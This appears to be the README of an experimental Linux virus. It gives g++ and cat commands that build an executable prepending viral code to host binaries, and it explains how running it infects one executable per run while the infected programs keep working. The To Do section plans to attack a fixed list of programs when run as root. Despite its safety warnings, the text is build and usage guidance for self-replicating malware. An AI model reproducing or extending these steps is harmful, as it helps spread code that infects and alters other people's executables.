This is a very simple EXPERIMENTAL virus program that runs in Linux.

This is a DANGEROUS experiment.
Do not run as root.
Only test inside a dedicated directory.

#### Bootstrap procedure

````
g++ -O -Wall -std=c++11 hi.cpp -o hi
g++ -O -Wall -std=c++11 v.cpp -o v_tmp && cat v_tmp hi >v && chmod +x v
ls -l v_tmp
````

Make sure the size of `v_tmp` is `MYSIZE` in the `v.cpp` source.
In case you have adjusted `MYSIZE`, do another

````
g++ -O -Wall -std=c++11 v.cpp -o v_tmp && cat v_tmp hi >v && chmod +x v
````

You can also use `make.bash`, which will run above in one chain.

#### Start

Run the virus bootstrap executable in a directory that contains (test) executables:

````
./v
````

This will infect one executable per run, until all files are infected.

* Infected files run like normal. The orginal code will be executed by the virus code
* Only executables in the current directory are infected
* Infected programs do no more evil than only infecting other programs

#### To Do

* Add a fixed list of programs that can be attacked when UID=0
